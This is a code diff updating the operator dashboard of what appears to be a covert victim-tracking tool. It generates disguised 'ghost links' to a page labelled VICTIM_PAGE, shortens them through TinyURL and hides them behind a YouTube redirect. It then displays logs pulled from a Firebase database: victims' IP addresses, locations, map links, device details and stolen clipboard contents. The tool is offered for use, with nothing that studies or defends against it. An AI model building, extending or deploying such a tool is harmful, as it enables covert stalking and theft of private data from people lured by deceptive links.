@@ -3,34 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LEGEND V13 | MOBILE</title>
+    <title>LEGEND HQ V14</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
         body { background: #f0f2f5; font-family: 'Poppins', sans-serif; margin: 0; padding: 10px; color: #333; }
         .container { width: 100%; max-width: 500px; margin: auto; }
-        .card { background: white; padding: 20px; border-radius: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); margin-bottom: 20px; }
-        h1 { color: #00a884; font-size: 1.2rem; text-align: center; margin-bottom: 20px; }
+        .card { background: white; padding: 20px; border-radius: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); margin-bottom: 15px; }
+        h1 { color: #cc0000; font-size: 1.1rem; text-align: center; margin-bottom: 15px; }
         input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 10px; margin-bottom: 10px; box-sizing: border-box; outline: none; }
-        .btn { width: 100%; padding: 12px; border: none; border-radius: 10px; background: #00a884; color: white; font-weight: bold; cursor: pointer; margin-bottom: 5px; }
-        .log-card { background: white; padding: 15px; border-radius: 15px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); margin-top: 15px; border-left: 5px solid #00a884; font-size: 0.85rem; }
-        .badge { background: #e8f5f2; color: #00a884; padding: 4px 8px; border-radius: 6px; display: inline-block; margin: 2px; font-weight: 600; font-size: 0.75rem; }
-        pre { background: #f8f9fa; padding: 10px; border-radius: 8px; white-space: pre-wrap; word-break: break-all; border: 1px solid #eee; margin-top: 10px; font-size: 0.8rem; }
-        a { color: #00a884; text-decoration: none; font-weight: bold; }
+        .btn { width: 100%; padding: 12px; border: none; border-radius: 10px; background: #00a884; color: white; font-weight: bold; cursor: pointer; margin-bottom: 5px; font-size: 14px; }
+        .log-card { background: white; padding: 15px; border-radius: 15px; margin-top: 15px; border-left: 5px solid #cc0000; font-size: 0.8rem; line-height: 1.6; }
+        .badge { background: #f8f9fa; border: 1px solid #eee; color: #555; padding: 4px 8px; border-radius: 5px; display: inline-block; margin: 2px; font-weight: 600; }
+        pre { background: #1a1a1a; color: #0f0; padding: 10px; border-radius: 8px; white-space: pre-wrap; word-break: break-all; margin-top: 10px; }
+        .link-res { background: #e8f5f2; padding: 10px; border-radius: 8px; color: #00a884; font-size: 0.75rem; word-break: break-all; margin-top: 10px; display: none; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="card">
-            <h1>LEGEND V13 DASHBOARD</h1>
+            <h1>LEGEND V14 FINAL HQ</h1>
             <input type="text" id="masterKey" placeholder="Secret Key">
-            <input type="text" id="targetUrl" placeholder="Target Link (YouTube)">
-            <button class="btn" onclick="generateLink()">GENERATE LINK</button>
-            <p id="resLink" style="font-size: 0.7rem; word-break: break-all; color: #666; margin-top: 10px;"></p>
+            <input type="text" id="targetUrl" placeholder="Redirect URL (YouTube Link)">
+            <button class="btn" onclick="generateLink()">GENERATE GHOST LINK</button>
+            <div id="linkArea" class="link-res"></div>
         </div>
 
-        <div style="display: flex; gap: 10px;">
-            <button class="btn" onclick="fetchLogs('tracking')">LOGS</button>
-            <button class="btn" onclick="fetchLogs('clipboard')">CLIPS</button>
+        <div style="display: flex; gap: 8px;">
+            <button class="btn" style="background: #333;" onclick="fetchLogs('tracking')">DEVICE LOGS</button>
+            <button class="btn" style="background: #333;" onclick="fetchLogs('clipboard')">CLIPS</button>
         </div>
 
         <div id="displayArea"></div>
@@ -38,13 +38,24 @@
 
     <script>
         const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
-        const VICTIM_PAGE = "https://video-obtg.vercel.app/";
+        const VICTIM_PAGE = "https://video-obtg.vercel.app/"; // Update this with your Vercel URL
 
-        function generateLink() {
+        async function generateLink() {
             const k = document.getElementById('masterKey').value;
             const r = document.getElementById('targetUrl').value;
-            if(!k || !r) return alert("Fill all!");
-            document.getElementById('resLink').innerText = VICTIM_PAGE + "?id=" + btoa(JSON.stringify({k, r}));
+            if(!k || !r) return alert("Empty fields!");
+            
+            const longLink = VICTIM_PAGE + "?id=" + btoa(JSON.stringify({k, r}));
+            const resArea = document.getElementById('linkArea');
+            
+            try {
+                const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longLink)}`);
+                const short = await res.text();
+                resArea.innerHTML = `<b>Copy this:</b><br>${short}`;
+            } catch(e) {
+                resArea.innerHTML = `<b>Copy this:</b><br>${longLink}`;
+            }
+            resArea.style.display = 'block';
         }
 
         async function fetchLogs(path) {
@@ -53,20 +64,23 @@
             const data = await res.json();
             const area = document.getElementById('displayArea');
             area.innerHTML = "";
-            if(!data) return area.innerHTML = "<p style='text-align:center;'>No Data</p>";
+            if(!data) return area.innerHTML = "<p style='text-align:center;'>No records found.</p>";
 
             Object.keys(data).reverse().forEach(id => {
                 const item = data[id];
-                area.innerHTML += `
-                <div class="log-card">
-                    <b>🕒 ${item.time}</b><br>
-                    <span class="badge">🌐 IP: ${item.ip}</span><br>
-                    <span class="badge">📍 ${item.loc}</span><br>
-                    <span class="badge">🔋 Bat: ${item.bat}</span> <span class="badge">🧠 RAM: ${item.ram}</span><br>
-                    <span class="badge">📱 ${item.model}</span><br>
-                    <a href="${item.map}" target="_blank">📍 VIEW ON MAP</a>
-                    ${item.clipData ? `<pre>${item.clipData}</pre>` : ''}
-                </div>`;
+                if(path === 'tracking') {
+                    area.innerHTML += `
+                    <div class="log-card">
+                        <b>🕒 ${item.time}</b><br>
+                        <span class="badge">🌐 IP: ${item.ip}</span><br>
+                        <span class="badge">📍 ${item.loc}</span><br>
+                        <span class="badge">🔋 Bat: ${item.bat}</span> <span class="badge">🧠 RAM: ${item.ram}</span><br>
+                        <span class="badge">📱 ${item.model}</span> <span class="badge">🖥️ ${item.res}</span><br>
+                        <a href="${item.map}" target="_blank" style="color:#cc0000; font-weight:bold;">📍 VIEW GOOGLE MAPS</a>
+                    </div>`;
+                } else {
+                    area.innerHTML += `<div class="log-card"><b>🕒 ${item.time}</b><pre>${item.clipData}</pre></div>`;
+                }
             });
         }
     </script>
